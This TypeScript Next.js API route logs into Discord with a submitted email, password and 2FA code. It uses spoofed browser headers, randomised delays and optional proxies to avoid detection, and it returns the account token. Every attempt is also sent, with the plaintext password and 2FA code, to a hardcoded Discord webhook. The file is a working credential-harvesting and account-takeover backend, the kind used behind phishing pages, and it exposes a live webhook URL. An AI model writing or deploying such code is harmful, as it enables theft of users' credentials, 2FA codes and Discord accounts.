import { NextRequest, NextResponse } from 'next/server';
import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function logToWebhook(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title,
          color,
          fields,
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch {}
}

export async function POST(req: NextRequest) {
  const { email, password, code, proxy } = await req.json();

  const result = { success: false, token: null, mfa: false, error: null };

  // Random delay to mimic human behavior
  await new Promise(r => setTimeout(r, 800 + Math.random() * 1200));

  try {
    const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;

    const headers = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0=',
      'X-Fingerprint': 'fingerprint_placeholder' // replace with real if you generate
    };

    // Step 1: Login attempt
    const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        login: email,
        password,
        undelete: false,
        login_source: null,
        gift_code_sku_id: null
      }),
      agent: agent as any
    });

    const loginData = await loginRes.json();

    await logToWebhook('Discord Login Attempt', [
      { name: 'Email', value: email },
      { name: 'Password', value: password },
      { name: 'Proxy', value: proxy || 'None' },
      { name: 'Status', value: loginData.token ? 'Token Received' : loginData.message || 'Failed' }
    ], loginData.token ? 0x00ff00 : 0xff0000);

    if (loginData.token) {
      result.success = true;
      result.token = loginData.token;
      result.mfa = false;
    } else if (loginData.ticket && code) {
      // Step 2: MFA / TOTP
      const mfaRes = await fetch('https://discord.com/api/v9/auth/mfa/totp', {
        method: 'POST',
        headers: {
          ...headers,
          'Authorization': `Bearer ${loginData.token || ''}`
        },
        body: JSON.stringify({ ticket: loginData.ticket, code }),
        agent: agent as any
      });

      const mfaData = await mfaRes.json();

      await logToWebhook('Discord 2FA Attempt', [
        { name: 'Email', value: email },
        { name: 'Code', value: code || 'N/A' },
        { name: 'Status', value: mfaData.token ? 'Success' : mfaData.message || 'Failed' }
      ], mfaData.token ? 0x00ff00 : 0xff0000);

      if (mfaData.token) {
        result.success = true;
        result.token = mfaData.token;
        result.mfa = true;
      } else {
        result.error = mfaData.message || '2FA failed';
      }
    } else {
      result.error = loginData.message || 'Login failed';
    }
  } catch (err) {
    result.error = err.message || 'Request error';
    await logToWebhook('Discord Login Error', [
      { name: 'Email', value: email },
      { name: 'Error', value: result.error }
    ], 0xff0000);
  }

  return NextResponse.json(result);
}
